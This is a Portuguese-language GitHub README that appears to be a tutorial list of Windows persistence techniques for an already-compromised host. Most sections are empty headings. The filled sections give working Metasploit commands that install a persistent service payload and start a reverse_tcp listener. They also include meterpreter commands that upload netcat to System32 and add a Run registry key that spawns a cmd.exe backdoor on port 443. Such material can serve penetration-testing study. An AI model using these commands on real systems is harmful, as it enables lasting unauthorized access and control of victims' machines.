# [Awesome Windows Persistence](https://github.com/Stuuxx/awesome-persistence)

**Técnicas e táticas para manutenção de persistência em um alvo explorado.**
Eu sou o Stux e estarei constantemente atualizando este repositório com novas técnicas tanto para Windows quanto para Linux!

## Sumário
 - Persistence Service(#persistence-service)
 - Persistence Registry
 - Netcat
 - RDP
 - Schtasks
 - Schtasks-Log Events
 - WMIC
 - Wmi-Persistence
 - SharPersist

## Persistence Service

Já com o alvo explorado e com uma shell meterpreter:
- Colocar a sessão em background;
- Utilizar e configurar o módulo exploit/windows/local/persistence_service do metasploit;
Este módulo irá gerar e fazer upload de um executável para o host explorado, em seguida irá torná-lo um serviço persistente. Ele criará um novo serviço que iniciará a carga útil sempre que o serviço estiver em execução.
**É necessário privilégio de administrador ou de sistema!**
```bash
background
use exploit/windows/local/persistence_service
set SESSION 1
exploit
```
![persistence-service](https://user-images.githubusercontent.com/67444297/198635234-f2d8beb0-a0e3-416f-a1b4-ad49d98448ed.jpg)
- Abrir uma nova aba no terminal;
- Utilizar o multi/handler, configurar-lo e colocar para ouvir;
```bash
msfconsole -q
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LPORT 4444
ip a s
set LHOST SEUIP
exploit
```
![persistence-service2](https://user-images.githubusercontent.com/67444297/198635249-b51498b3-7cc6-4cc5-9849-4b143b71e1de.jpg)
Note que logo que você colocar para ouvir o multi/handler, já receberá uma nova shell, isso se da ao fato de que essa técnica é voltada a um serviço persistente, ou seja, está executando o payload diversas vezes enquanto está vivo.
Para prova de conceito, iremos dar um reboot na máquina explorada e aguardar a shell em nosso multi/handler.
![persistence-service3](https://user-images.githubusercontent.com/67444297/198635260-54025d20-366e-4e76-a31e-1731e7da1702.jpg)


## Persistence Registry


## Netcat

Já com o alvo explorado e com uma shell meterpreter:
- Vamos realizar o upload do netcat para algum diretório do alvo.
```bash
upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32
```
nc1.jpg

- Após realizado o upload, iremos modificar o registro para que o Netcat seja executado.
```bash
reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d 'C:\windows\system32\nc.exe -Ldp 443 -e C:\windows\system32\cmd.exe'
```
nc2.jpg



## RDP

Já com o alvo explorado e com uma shell meterpreter:


## Schtasks

Já com o alvo explorado e com uma shell meterpreter:


## Schtasks - Log Events

Já com o alvo explorado e com uma shell meterpreter:


## Ficou com alguma dúvida?
Sinta-se a vontade para entrar em contato comigo através de minhas redes sociais!
 - LinkedIn : [Eduardo Maragno](https://www.linkedin.com/in/eduardo-maragno/)
 - Bugcrowd : [@Stux](https://bugcrowd.com/StuxRs)
 - Medium : [@Stux](https://medium.com/@stux)
 - Twitter : [@StuxRs](https://twitter.com/StuxRs)
